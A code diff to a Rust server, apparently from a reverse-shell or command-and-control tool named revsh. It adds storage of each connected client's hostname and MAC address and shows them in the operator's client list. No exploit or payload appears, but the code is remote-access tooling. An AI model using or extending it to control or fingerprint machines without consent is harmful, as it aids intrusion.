@@ -14,12 +14,18 @@ use chrono::{ DateTime, Utc };
 use revsh_common::*;
 use revsh_server::*;
 
+struct ClientHelloData {
+    pub hostname: String,
+    pub mac_address: mac_address::MacAddress,
+}
+
 struct Client {
     pub uid: UID,
     pub connected_since: DateTime<Utc>,
     pub addr: SocketAddr,
 
     pub out_events: mpsc::Sender<OutClientEvent>,
+    pub hello_data: Option<ClientHelloData>,
 }
 
 #[derive(Debug, Clone)]
@@ -66,6 +72,7 @@ async fn main() -> anyhow::Result<()> {
                     addr,
                     connected_since: Utc::now(),
                     out_events: out_sender,
+                    hello_data: None,
                 });
                 global_sender.send(GlobalEvent::NewClient { uid }).unwrap();
 
@@ -119,11 +126,21 @@ async fn main() -> anyhow::Result<()> {
                             },
                             a => a.unwrap(),
                         };
-
-                        global_sender.send(GlobalEvent::ClientMessage {
-                            sender: uid,
-                            message: mess
-                        }).unwrap();
+                        
+                        if let C2SMessage::Hello { mac_address, hostname } = mess {
+                            let mut clis = clis.write().unwrap();
+                            let client = clis.get_mut(&uid).unwrap();
+                            client.hello_data = Some(ClientHelloData {
+                                hostname: hostname.clone(),
+                                mac_address: mac_address.clone()
+                            });
+                        }
+                        else {
+                            global_sender.send(GlobalEvent::ClientMessage {
+                                sender: uid,
+                                message: mess
+                            }).unwrap();
+                        }
                     }
                 });
             },
@@ -158,6 +175,8 @@ async fn handle_cli_client(
                                 uid: client.uid,
                                 addr: client.addr,
                                 connected_at: client.connected_since,
+                                hostname: client.hello_data.as_ref().map(|h| h.hostname.clone()),
+                                mac_address: client.hello_data.as_ref().map(|h| h.mac_address.clone()),
                             }
                         }
                     };
@@ -199,6 +218,8 @@ async fn handle_cli_client(
                                     uid,
                                     addr: client.addr,
                                     connected_at: client.connected_since,
+                                    hostname: client.hello_data.as_ref().map(|h| h.hostname.clone()),
+                                    mac_address: client.hello_data.as_ref().map(|h| h.mac_address.clone()),
                                 }
                             }).collect::<Vec<_>>();
                         send_message_into(
